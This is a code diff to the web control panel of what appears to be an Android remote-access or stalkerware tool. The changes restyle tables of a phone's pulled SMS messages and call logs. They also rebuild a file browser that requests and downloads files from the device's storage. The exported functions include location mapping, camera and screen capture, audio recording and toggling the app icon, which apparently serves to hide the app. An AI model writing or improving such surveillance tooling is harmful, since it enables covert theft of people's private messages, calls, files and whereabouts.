@@ -73,16 +73,17 @@ body{background:#0f1117;font-family:'Segoe UI',system-ui,sans-serif;display:flex
 .log-table-wrap{overflow:auto;border-radius:8px;border:1px solid #2a2d3a}
 table{width:100%;border-collapse:collapse;font-size:13px}
 th{background:#12141e;color:#94a3b8;font-weight:600;padding:10px 12px;text-align:left;border-bottom:1px solid #2a2d3a;white-space:nowrap;position:sticky;top:0;z-index:2}
-td{padding:9px 12px;border-bottom:1px solid #1e2130;color:#cbd5e1;vertical-align:middle}
+td{padding:8px 12px;border-bottom:1px solid #1e2130;color:#cbd5e1;vertical-align:top}
 tr:last-child td{border-bottom:none}
 tr:hover td{background:#1e2233}
-.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
-.badge-in{background:#1a3b2a;color:#4ade80}
-.badge-out{background:#1e3a5f;color:#60a5fa}
-.badge-miss{background:#3b1a1a;color:#f87171}
-.badge-unread{background:#3b2800;color:#fb923c}
-.sms-body{max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#94a3b8}
-.sms-body:hover{white-space:normal;overflow:visible;background:#252836;border-radius:4px;padding:4px}
+/* SMS type badge — wider, color-coded */
+.badge{display:inline-flex;align-items:center;justify-content:center;padding:3px 0;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.4px;width:72px;text-align:center}
+.badge-in{background:#0f2d1a;color:#4ade80;border:1px solid #166534}
+.badge-out{background:#0f1e3a;color:#60a5fa;border:1px solid #1e40af}
+.badge-miss{background:#2d0f0f;color:#f87171;border:1px solid #991b1b}
+.badge-unread{background:#2d1a00;color:#fb923c;border:1px solid #92400e;width:auto;padding:2px 6px}
+/* SMS message cell — word wrap, constrained width */
+td.sms-msg{max-width:220px;min-width:120px;white-space:pre-wrap;word-break:break-word;color:#94a3b8;font-size:12px;line-height:1.5}
 .duration-bar{display:flex;align-items:center;gap:6px}
 .duration-fill{height:4px;background:#2563eb;border-radius:2px;min-width:2px}
 .pagination{margin-top:14px;display:flex;gap:6px;justify-content:center;align-items:center;flex-wrap:wrap}
@@ -90,47 +91,48 @@ tr:hover td{background:#1e2233}
 .page-btn:hover,.page-btn.active{background:#2563eb;color:white;border-color:#2563eb}
 .page-info{font-size:12px;color:#4b5563}
 
-/* ── File Manager Tree ── */
-.fm-wrap{display:flex;flex-direction:column;height:100%;gap:10px}
-.fm-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;background:#12141e;border-radius:8px;padding:10px;border:1px solid #2a2d3a}
-.fm-toolbar button{flex:none;background:#252836;color:#cbd5e1;border:1px solid #374151;border-radius:6px;padding:5px 12px;font-size:12px;cursor:pointer;transition:.15s}
+/* ── File Manager — unified tree list (like Windows Explorer) ── */
+.fm-wrap{display:flex;flex-direction:column;height:100%;gap:8px}
+.fm-toolbar{display:flex;align-items:center;gap:6px;flex-wrap:wrap;background:#12141e;border-radius:8px;padding:8px 10px;border:1px solid #2a2d3a}
+.fm-toolbar button{flex:none;background:#252836;color:#cbd5e1;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:12px;cursor:pointer;transition:.15s}
 .fm-toolbar button:hover{background:#2563eb;color:white;border-color:#2563eb}
-.fm-toolbar button.dl-btn{background:#2563eb;color:white;border-color:#2563eb;font-weight:500}
-.fm-toolbar button.dl-btn:hover{background:#1d4ed8}
-.fm-path{flex:1;background:#252836;border:1px solid #374151;border-radius:6px;padding:5px 10px;font-size:12px;color:#94a3b8;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.fm-body{display:flex;gap:0;border:1px solid #2a2d3a;border-radius:10px;overflow:hidden;flex:1;min-height:400px}
-/* Left tree panel */
-.fm-tree{width:260px;flex-shrink:0;background:#12141e;border-right:1px solid #2a2d3a;overflow-y:auto;padding:6px 0}
-/* Right file list */
-.fm-files{flex:1;background:#1a1d27;overflow-y:auto;padding:6px 0}
-.fm-col-header{display:flex;align-items:center;padding:6px 12px;font-size:11px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #1e2130;background:#12141e;position:sticky;top:0;z-index:2}
+.fm-toolbar .dl-btn{background:#2563eb;color:white;border-color:#2563eb;font-weight:600}
+.fm-toolbar .dl-btn:hover{background:#1d4ed8}
+.fm-toolbar .dl-btn:disabled{background:#1e2a4a;color:#4b6cb7;cursor:not-allowed;border-color:#2a3a5a}
+.fm-path{flex:1;background:#252836;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:11px;color:#64748b;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+/* single scrollable tree panel */
+.fm-tree-panel{border:1px solid #2a2d3a;border-radius:10px;overflow-y:auto;flex:1;min-height:420px;background:#12141e}
+/* column header row */
+.fm-thead{display:flex;align-items:center;padding:5px 8px;font-size:10px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #1e2130;background:#0f1117;position:sticky;top:0;z-index:5;user-select:none}
+.fm-col-sel{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.fm-col-sel input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
 .fm-col-name{flex:1}
-.fm-col-size{width:70px;text-align:right}
-.fm-col-date{width:110px}
-.fm-col-chk{width:28px}
-/* Tree node */
-.tree-node{display:flex;align-items:center;padding:5px 6px;cursor:pointer;user-select:none;border-radius:0;transition:.1s;font-size:13px;color:#94a3b8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.tree-node:hover{background:#1e2233;color:#e2e8f0}
-.tree-node.active{background:#1e3a5f;color:#60a5fa}
-.tree-node.active:hover{background:#1e3a5f}
-.tree-toggle{width:16px;height:16px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#4b5563;font-size:10px;transition:.15s}
-.tree-toggle.open{transform:rotate(90deg);color:#60a5fa}
-.tree-icon{font-size:14px;margin:0 5px;flex-shrink:0}
-.tree-name{flex:1;overflow:hidden;text-overflow:ellipsis;font-size:13px}
-.tree-children{display:none;padding-left:0}
-.tree-children.open{display:block}
-/* File row */
-.file-row{display:flex;align-items:center;padding:6px 12px;font-size:13px;color:#cbd5e1;border-bottom:1px solid #1e2130;transition:.1s;cursor:default}
-.file-row:last-child{border-bottom:none}
-.file-row:hover{background:#1e2233}
-.file-row.selected{background:#1e3a5f}
-.file-row-name{flex:1;display:flex;align-items:center;gap:7px;overflow:hidden}
-.file-row-name span.fn{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.file-row-size{width:70px;text-align:right;color:#4b5563;font-size:12px}
-.file-row-date{width:110px;color:#4b5563;font-size:11px}
-.file-chk{width:28px;display:flex;align-items:center;justify-content:center}
-.file-chk input{accent-color:#2563eb;cursor:pointer;width:14px;height:14px}
-.fm-empty{padding:40px;text-align:center;color:#4b5563;font-size:13px}
+.fm-col-size{width:78px;text-align:right}
+.fm-col-date{width:90px;text-align:right}
+/* tree row shared */
+.tr-row{display:flex;align-items:center;font-size:13px;border-bottom:1px solid #161825;transition:.1s;user-select:none}
+.tr-row:last-child{border-bottom:none}
+/* folder row */
+.tr-folder{color:#94a3b8;cursor:pointer;padding:4px 0}
+.tr-folder:hover{background:#1a1d2a;color:#e2e8f0}
+.tr-folder.active{background:#162032;color:#60a5fa}
+/* file row */
+.tr-file{color:#cbd5e1;cursor:default;padding:3px 0;background:#0f1117}
+.tr-file:hover{background:#13161f}
+.tr-file.sel{background:#0f1e3a}
+/* shared cells */
+.tr-indent{flex-shrink:0}
+.tr-toggle{width:14px;height:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#374151;font-size:9px;margin-right:1px}
+.tr-toggle.open{color:#60a5fa}
+.tr-ico{font-size:13px;margin:0 4px;flex-shrink:0;line-height:1}
+.tr-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12.5px}
+.tr-size{width:78px;text-align:right;color:#374151;font-size:11px;padding-right:8px}
+.tr-date{width:90px;text-align:right;color:#374151;font-size:10px;padding-right:8px}
+.tr-chk{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.tr-chk input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
+.fm-children{display:none}
+.fm-children.open{display:block}
+.fm-empty{padding:30px;text-align:center;color:#374151;font-size:13px}
 
 img,video{max-width:100%;max-height:72vh;border-radius:8px;display:block;margin:0 auto}
 audio{width:100%;margin-top:12px;border-radius:8px}
@@ -474,7 +476,12 @@ function handleJSON(json){
       if(loc&&loc.lng!=null&&loc.lon==null) loc.lon=loc.lng;
       renderMap(loc); pendingCmd=null; break;
     }
-    case 'CAMERA_IMAGE': displayCapturedImage(json.data); pendingCmd=null; break;
+    case 'FILE_DATA': {
+      // Android sends file as JSON: {type:"FILE_DATA", path:"...", data:"base64..."}
+      const fname=(json.path||'file_'+Date.now()).split('/').pop();
+      if(json.data) dlBase64(json.data, fname);
+      break;
+    }
     case 'AUDIO_RECORDING': case 'AUDIO_DATA': showAudio(json.data); pendingCmd=null; break;
     case 'ERROR':
       panel().innerHTML='<div style="color:#f87171;padding:10px">❌ '+(json.error||json.message)+'</div>';
@@ -625,37 +632,44 @@ function renderTable(){
   let rows='';
   if(isSMS){
     rows=page.map(i=>{
-      const t=(i.type||'').toLowerCase();
-      const badge=t.includes('in')?'badge-in':t.includes('out')?'badge-out':'badge-miss';
-      const label=t.includes('in')?'IN':'OUT';
-      const unread=i.read===false?'<span class="badge badge-unread">NEW</span>':'';
-      return `<tr>
-        <td><span class="badge ${badge}">${label}</span> ${unread}</td>
-        <td style="font-weight:500;color:#e2e8f0">${esc(i.address||i.number||'-')}</td>
-        <td><div class="sms-body" title="${esc(i.body||'')}">${esc(i.body||'')}</div></td>
-        <td style="color:#4b5563;font-size:12px;white-space:nowrap">${esc(i.date||'-')}</td>
+      const t=String(i.type||'').toLowerCase();
+      // Android SMS type: 1=inbox,2=sent,3=draft,4=outbox,5=failed,6=queued
+      const raw=parseInt(i.type)||0;
+      const isIn=t.includes('in')||raw===1;
+      const isOut=t.includes('out')||raw===2||raw===4;
+      const badge=isIn?'badge-in':isOut?'badge-out':'badge-miss';
+      const label=isIn?'📥 Inbox':isOut?'📤 Sent':'📩 Other';
+      const isUnread=i.read==='false'||i.read===false||i.read==='0'||i.read===0;
+      const unreadPip=isUnread?'<span style="display:inline-block;width:6px;height:6px;background:#fb923c;border-radius:50%;margin-left:5px;vertical-align:middle"></span>':'';
+      return `<tr style="${isIn?'background:#0a110f':isOut?'background:#0a0f1a':''}">
+        <td style="vertical-align:top;width:82px"><span class="badge ${badge}">${label}</span>${unreadPip}</td>
+        <td style="font-weight:500;color:#e2e8f0;white-space:nowrap;font-size:12px">${esc(i.address||i.number||'-')}</td>
+        <td class="sms-msg">${esc(i.body||'—')}</td>
+        <td style="color:#4b5563;font-size:11px;white-space:nowrap;vertical-align:top">${esc(i.date||'-')}</td>
       </tr>`;
     }).join('');
   } else {
     const maxDur=Math.max(...currentData.map(i=>parseInt(i.duration)||0),1);
     rows=page.map(i=>{
-      const t=(i.type||'').toLowerCase();
-      const badge=t.includes('miss')?'badge-miss':t.includes('out')?'badge-out':'badge-in';
-      const label=t.includes('miss')?'MISS':t.includes('out')?'OUT':'IN';
+      const t=String(i.type||'').toLowerCase();
+      const isMiss=t.includes('miss')||t==='3';
+      const isOut=t.includes('out')||t==='2';
+      const badge=isMiss?'badge-miss':isOut?'badge-out':'badge-in';
+      const label=isMiss?'📵 Missed':isOut?'📤 Outgoing':'📞 Incoming';
       const dur=parseInt(i.duration)||0;
-      const barW=Math.round(dur/maxDur*80);
-      return `<tr>
-        <td><span class="badge ${badge}">${label}</span></td>
-        <td style="font-weight:500;color:#e2e8f0">${esc(i.number||i.phoneNumber||'-')}</td>
-        <td style="color:#94a3b8">${esc(i.name||i.cachedName||'Unknown')}</td>
-        <td style="color:#4b5563;font-size:12px;white-space:nowrap">${esc(i.date||'-')}</td>
-        <td><div class="duration-bar"><div class="duration-fill" style="width:${barW}px"></div><span style="font-size:12px;color:#4b5563">${fmtDur(dur)}</span></div></td>
+      const barW=Math.round(dur/maxDur*70);
+      return `<tr style="${isMiss?'background:#120a0a':isOut?'background:#0a0f1a':'background:#0a110f'}">
+        <td style="width:90px"><span class="badge ${badge}">${label}</span></td>
+        <td style="font-weight:500;color:#e2e8f0;white-space:nowrap;font-size:12px">${esc(i.number||i.phoneNumber||'-')}</td>
+        <td style="color:#94a3b8;font-size:12px">${esc(i.name||i.cachedName||'—')}</td>
+        <td style="color:#4b5563;font-size:11px;white-space:nowrap">${esc(i.date||'-')}</td>
+        <td><div class="duration-bar"><div class="duration-fill" style="width:${barW}px"></div><span style="font-size:11px;color:#4b5563">${fmtDur(dur)}</span></div></td>
       </tr>`;
     }).join('');
   }
 
-  const smsHeaders='<th>Type</th><th>Number</th><th>Message</th><th>Date</th>';
-  const callHeaders='<th>Type</th><th>Number</th><th>Name</th><th>Date</th><th>Duration</th>';
+  const smsHeaders='<th style="width:82px">Type</th><th>Number</th><th>Message</th><th style="width:110px">Date</th>';
+  const callHeaders='<th style="width:90px">Type</th><th>Number</th><th>Name</th><th style="width:110px">Date</th><th style="width:100px">Duration</th>';
 
   let pager='';
   if(totalPages>1){
@@ -715,193 +729,191 @@ function handleFileList(items){
 const _pathIdMap=new Map(); let _pathIdCtr=0;
 function pathId(p){ if(!_pathIdMap.has(p)){ _pathIdMap.set(p,_pathIdCtr++); } return 'pid'+_pathIdMap.get(p); }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// FILE MANAGER — unified Windows Explorer tree list
+// ─────────────────────────────────────────────────────────────────────────────
+
 function renderFileManager(){
-  _pathIdMap.clear(); _pathIdCtr=0;
-  const items=fileCache['root']||[];
+  _pathIdMap.clear(); _pathIdCtr=0; selectedFiles.clear();
   panel().innerHTML=`<div class="fm-wrap">
     <div class="fm-toolbar">
       <button onclick="navUp()">⬆ Up</button>
       <button onclick="refreshFolder()">↺ Refresh</button>
+      <button onclick="selAll()">☑ All</button>
+      <button onclick="selNone()">☐ None</button>
       <div class="fm-path" id="fmPath">/storage/emulated/0</div>
-      <button class="dl-btn" id="dlBtn" onclick="downloadSel()">💾 Download (0)</button>
+      <button class="dl-btn" id="dlBtn" onclick="downloadSel()" disabled>💾 Download (0)</button>
     </div>
-    <div class="fm-body">
-      <div class="fm-tree" id="fmTree"></div>
-      <div class="fm-files">
-        <div class="fm-col-header">
-          <div class="fm-col-chk"></div>
-          <div class="fm-col-name">Name</div>
-          <div class="fm-col-size">Size</div>
-          <div class="fm-col-date">Modified</div>
-        </div>
-        <div id="fmFileRows"><div class="fm-empty">↑ Select a folder from the tree</div></div>
+    <div class="fm-tree-panel" id="fmTree">
+      <div class="fm-thead">
+        <div class="fm-col-sel"></div>
+        <div class="fm-col-name">Name</div>
+        <div class="fm-col-size">Size</div>
+        <div class="fm-col-date">Modified</div>
       </div>
+      <div id="fmRows"><div class="fm-empty">⏳ Loading…</div></div>
     </div>
   </div>`;
-  buildTree('root', items, document.getElementById('fmTree'), 0);
+  buildFMTree('root', fileCache['root']||[], document.getElementById('fmRows'), 0);
 }
 
-function buildTree(path, items, container, depth){
+function buildFMTree(path, items, container, depth){
+  container.innerHTML='';
   const folders=(items||[]).filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
-  if(!folders.length && depth>0){
-    // leaf — no subfolders, nothing to render in tree
-    return;
-  }
+  const files=(items||[]).filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
+  // files shown inline at this depth
+  files.forEach(f=>container.appendChild(makeFileRow(f, depth)));
   folders.forEach(f=>{
     const id=pathId(f.path);
-    const indent=depth*18;
-    const hasCache=!!fileCache[f.path];
-
-    // Node row
-    const node=document.createElement('div');
-    node.className='tree-node'+(f.path===activeFolderPath?' active':'');
-    node.id='tn_'+id;
-    node.dataset.path=f.path;
-    // indent spacer + toggle arrow + folder icon + name
-    node.innerHTML=
-      `<div style="width:${indent}px;min-width:${indent}px"></div>`+
-      `<div class="tree-toggle" id="tt_${id}">▶</div>`+
-      `<div class="tree-icon" id="ti_${id}">📁</div>`+
-      `<div class="tree-name">${esc(f.name)}</div>`;
-    node.onclick=(e)=>{ e.stopPropagation(); treeClickFolder(f.path, id); };
-    container.appendChild(node);
-
-    // Children container (hidden by default)
+    const indent=depth*16;
+    const row=document.createElement('div');
+    row.className='tr-row tr-folder'+(f.path===activeFolderPath?' active':'');
+    row.id='tn_'+id; row.title=f.path;
+    row.innerHTML=
+      `<div class="tr-indent" style="width:${indent}px"></div>`+
+      `<div class="tr-chk"><span style="display:inline-block;width:13px"></span></div>`+
+      `<div class="tr-toggle" id="tt_${id}">▶</div>`+
+      `<div class="tr-ico" id="ti_${id}">📁</div>`+
+      `<div class="tr-name">${esc(f.name)}</div>`+
+      `<div class="tr-size">${f.childCount!=null?f.childCount+' items':'—'}</div>`+
+      `<div class="tr-date">${(f.lastModified||'').substring(0,10)}</div>`;
+    row.onclick=(e)=>{ e.stopPropagation(); fmClickFolder(f.path,id); };
+    container.appendChild(row);
     const childDiv=document.createElement('div');
-    childDiv.className='tree-children';
-    childDiv.id='tc_'+id;
+    childDiv.className='fm-children'; childDiv.id='tc_'+id;
     container.appendChild(childDiv);
-
-    // If already cached, pre-build children
-    if(hasCache) buildTree(f.path, fileCache[f.path], childDiv, depth+1);
+    if(fileCache[f.path]) buildFMTree(f.path, fileCache[f.path], childDiv, depth+1);
   });
+  if(!folders.length&&!files.length&&depth>0){
+    const e=document.createElement('div');
+    e.className='fm-empty'; e.style.padding='8px 32px'; e.textContent='Empty folder';
+    container.appendChild(e);
+  }
 }
 
-function treeClickFolder(path, id){
-  // 1. Highlight
-  document.querySelectorAll('.tree-node').forEach(n=>n.classList.remove('active'));
+function makeFileRow(f, depth){
+  const indent=depth*16;
+  const d=document.createElement('div');
+  d.className='tr-row tr-file'; d.dataset.path=f.path;
+  d.innerHTML=
+    `<div class="tr-indent" style="width:${indent}px"></div>`+
+    `<div class="tr-chk"><input type="checkbox" data-path="${esc(f.path)}" onchange="toggleFileSel(this,event)"></div>`+
+    `<div class="tr-toggle" style="visibility:hidden">▶</div>`+
+    `<div class="tr-ico">${fileIco(f.name)}</div>`+
+    `<div class="tr-name" title="${esc(f.path)}">${esc(f.name)}</div>`+
+    `<div class="tr-size">${fmtBytes(f.size)}</div>`+
+    `<div class="tr-date">${(f.lastModified||'').substring(0,10)}</div>`;
+  return d;
+}
+
+function fmClickFolder(path, id){
+  document.querySelectorAll('.tr-folder').forEach(n=>n.classList.remove('active'));
   const node=document.getElementById('tn_'+id);
   if(node) node.classList.add('active');
   activeFolderPath=path;
   const pathEl=document.getElementById('fmPath');
   if(pathEl) pathEl.innerText=path==='root'?'/storage/emulated/0':path;
-
-  // 2. Toggle expand
   const childEl=document.getElementById('tc_'+id);
   const toggleEl=document.getElementById('tt_'+id);
   const iconEl=document.getElementById('ti_'+id);
   if(childEl){
-    const isOpen=childEl.classList.contains('open');
-    const willOpen=!isOpen;
-    childEl.classList.toggle('open', willOpen);
-    if(toggleEl) toggleEl.classList.toggle('open', willOpen);
+    const willOpen=!childEl.classList.contains('open');
+    childEl.classList.toggle('open',willOpen);
+    if(toggleEl) toggleEl.classList.toggle('open',willOpen);
     if(iconEl) iconEl.textContent=willOpen?'📂':'📁';
-    // Lazy-build children if first expand and already cached
-    if(willOpen && childEl.childElementCount===0 && fileCache[path]){
-      buildTree(path, fileCache[path], childEl, getDepth(path)+1);
+    if(willOpen && childEl.childElementCount===0){
+      if(fileCache[path]){ buildFMTree(path,fileCache[path],childEl,getDepth(path)+1); }
+      else {
+        childEl.innerHTML='<div class="fm-empty" style="padding:8px 32px">⏳ Loading…</div>';
+        currentTreePath=path; sendCommand('LIST_FILES',{path});
+      }
     }
-  }
-
-  // 3. Load files — from cache or request
-  if(fileCache[path]){
-    renderFileList(path);
-  } else {
-    currentTreePath=path;
-    document.getElementById('fmFileRows').innerHTML='<div class="fm-empty">⏳ Loading…</div>';
-    sendCommand('LIST_FILES',{path});
   }
 }
 
-function updateTree(path, items){
-  // Called after server responds with file list for `path`
-  const id=pathId(path);
+function handleFileList(items){
+  fileCache[currentTreePath]=items;
+  if(currentTreePath==='root'){ renderFileManager(); return; }
+  const id=pathId(currentTreePath);
   const childEl=document.getElementById('tc_'+id);
   const toggleEl=document.getElementById('tt_'+id);
   const iconEl=document.getElementById('ti_'+id);
   if(childEl){
-    childEl.innerHTML='';
-    buildTree(path, items, childEl, getDepth(path)+1);
+    buildFMTree(currentTreePath,items,childEl,getDepth(currentTreePath)+1);
     childEl.classList.add('open');
     if(toggleEl) toggleEl.classList.add('open');
     if(iconEl) iconEl.textContent='📂';
-  }
-  renderFileList(path);
+  } else { renderFileManager(); }
 }
 
 function getDepth(path){
   if(!path||path==='root') return 0;
-  // /storage/emulated/0 = depth 0 equivalent
-  const parts=path.split('/').filter(Boolean);
-  return Math.max(0, parts.length-3);
+  return Math.max(0, path.split('/').filter(Boolean).length-3);
 }
 
-function renderFileList(path){
-  const items=fileCache[path]||[];
-  const files=items.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
-  const rows=document.getElementById('fmFileRows');
-  if(!rows) return;
-  selectedFiles.clear(); updateDlBtn();
-  if(!files.length){
-    rows.innerHTML='<div class="fm-empty">📂 No files in this folder</div>'; return;
-  }
-  rows.innerHTML=files.map(f=>`
-    <div class="file-row">
-      <div class="file-chk"><input type="checkbox" data-path="${esc(f.path)}" onchange="toggleFileSel(this)"></div>
-      <div class="file-row-name">${fileIco(f.name)}<span class="fn" title="${esc(f.path)}">${esc(f.name)}</span></div>
-      <div class="file-row-size">${fmtBytes(f.size)}</div>
-      <div class="file-row-date">${(f.lastModified||'').substring(0,10)}</div>
-    </div>`).join('');
-}
-
-function toggleFileSel(cb){
-  const p=cb.dataset.path;
-  const row=cb.closest('.file-row');
-  if(cb.checked){ selectedFiles.add(p); row&&row.classList.add('selected'); }
-  else { selectedFiles.delete(p); row&&row.classList.remove('selected'); }
+function toggleFileSel(cb,e){
+  if(e) e.stopPropagation();
+  const p=cb.dataset.path, row=cb.closest('.tr-file');
+  if(cb.checked){ selectedFiles.add(p); row&&row.classList.add('sel'); }
+  else{ selectedFiles.delete(p); row&&row.classList.remove('sel'); }
   updateDlBtn();
 }
+function selAll(){
+  document.querySelectorAll('.tr-file input[type=checkbox]').forEach(cb=>{
+    cb.checked=true; selectedFiles.add(cb.dataset.path);
+    const r=cb.closest('.tr-file'); if(r) r.classList.add('sel');
+  }); updateDlBtn();
+}
+function selNone(){
+  document.querySelectorAll('.tr-file input[type=checkbox]').forEach(cb=>{
+    cb.checked=false; const r=cb.closest('.tr-file'); if(r) r.classList.remove('sel');
+  }); selectedFiles.clear(); updateDlBtn();
+}
 function updateDlBtn(){
-  const b=document.getElementById('dlBtn');
-  if(b) b.innerText='💾 Download ('+selectedFiles.size+')';
+  const b=document.getElementById('dlBtn'); if(!b) return;
+  const n=selectedFiles.size; b.innerText='💾 Download ('+n+')'; b.disabled=n===0;
 }
 function downloadSel(){
-  if(!selectedFiles.size){ notify('No files selected'); return; }
-  selectedFiles.forEach(p=>sendPlain('dl '+p));
+  if(!selectedFiles.size){ notify('Select files first'); return; }
+  notify('⬇ Sending '+selectedFiles.size+' request(s)…');
+  selectedFiles.forEach(p=>{ if(ws&&ws.readyState===1) ws.send('dl '+p); });
 }
 function navUp(){
   if(!activeFolderPath||activeFolderPath==='root') return;
   const parts=activeFolderPath.split('/'); parts.pop();
   const parent=parts.length<=3?'root':parts.join('/');
-  currentTreePath=parent; activeFolderPath=parent;
+  activeFolderPath=parent;
   const pathEl=document.getElementById('fmPath');
   if(pathEl) pathEl.innerText=parent==='root'?'/storage/emulated/0':parent;
-  if(fileCache[parent]) renderFileList(parent);
-  else { document.getElementById('fmFileRows').innerHTML='<div class="fm-empty">⏳ Loading…</div>'; sendCommand('LIST_FILES',{path:parent}); }
+  const pid=pathId(parent);
+  document.querySelectorAll('.tr-folder').forEach(n=>n.classList.remove('active'));
+  const pnode=document.getElementById('tn_'+pid); if(pnode) pnode.classList.add('active');
 }
 function refreshFolder(){
   if(!activeFolderPath) return;
-  delete fileCache[activeFolderPath];
-  currentTreePath=activeFolderPath;
-  document.getElementById('fmFileRows').innerHTML='<div class="fm-empty">⏳ Refreshing…</div>';
+  delete fileCache[activeFolderPath]; currentTreePath=activeFolderPath;
+  const id=pathId(activeFolderPath);
+  const c=document.getElementById('tc_'+id);
+  if(c) c.innerHTML='<div class="fm-empty" style="padding:8px 32px">⏳ Refreshing…</div>';
   sendCommand('LIST_FILES',{path:activeFolderPath});
 }
 function fileIco(n){
   const e=(n||'').split('.').pop().toLowerCase();
-  if(['jpg','jpeg','png','gif','webp','bmp','heic'].includes(e)) return '🖼 ';
-  if(['mp4','mkv','avi','mov','webm','3gp'].includes(e)) return '🎬 ';
-  if(['mp3','aac','wav','m4a','ogg','flac'].includes(e)) return '🎵 ';
-  if(['pdf'].includes(e)) return '📕 ';
-  if(['zip','rar','7z','tar','gz'].includes(e)) return '🗜 ';
-  if(['apk'].includes(e)) return '📦 ';
-  if(['txt','log','md','csv'].includes(e)) return '📝 ';
-  if(['doc','docx','xls','xlsx','ppt','pptx'].includes(e)) return '📊 ';
+  if(['jpg','jpeg','png','gif','webp','bmp','heic'].includes(e)) return '🖼';
+  if(['mp4','mkv','avi','mov','webm','3gp'].includes(e)) return '🎬';
+  if(['mp3','aac','wav','m4a','ogg','flac','amr'].includes(e)) return '🎵';
+  if(e==='pdf') return '📕';
+  if(['zip','rar','7z','tar','gz'].includes(e)) return '🗜';
+  if(e==='apk') return '📦';
+  if(['txt','log','md','csv'].includes(e)) return '📝';
+  if(['doc','docx','xls','xlsx','ppt','pptx'].includes(e)) return '📊';
   return '📄';
 }
 function fmtBytes(b){
-  if(!b) return '—';
-  const k=1024,sz=['B','KB','MB','GB'];
-  const i=Math.floor(Math.log(b)/Math.log(k));
-  return (b/Math.pow(k,i)).toFixed(1)+' '+sz[i];
+  if(!b||b<=0) return '—';
+  const k=1024, sz=['B','KB','MB','GB'];
+  const i=Math.min(Math.floor(Math.log(b)/Math.log(k)),sz.length-1);
+  return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+sz[i];
 }
 
 // ── Expose globals ─────────────────────────────────────────────────────────────
@@ -914,7 +926,8 @@ window.toggleAppIcon=toggleAppIcon; window.takeSnapshot=takeSnapshot;
 window.toggleCamRec=toggleCamRec; window.toggleScreenRec=toggleScreenRec;
 window.changeScreenQ=changeScreenQ; window.dlBase64=dlBase64;
 window.gotoPage=gotoPage; window.filterRows=filterRows;
-window.treeClickFolder=treeClickFolder; window.toggleFileSel=toggleFileSel;
+window.treeClickFolder=fmClickFolder; window.fmClickFolder=fmClickFolder;
+window.toggleFileSel=toggleFileSel; window.selAll=selAll; window.selNone=selNone;
 window.downloadSel=downloadSel; window.navUp=navUp; window.refreshFolder=refreshFolder;
 window.snapScreen=snapScreen; window.connectWebSocket=connectWebSocket;
 
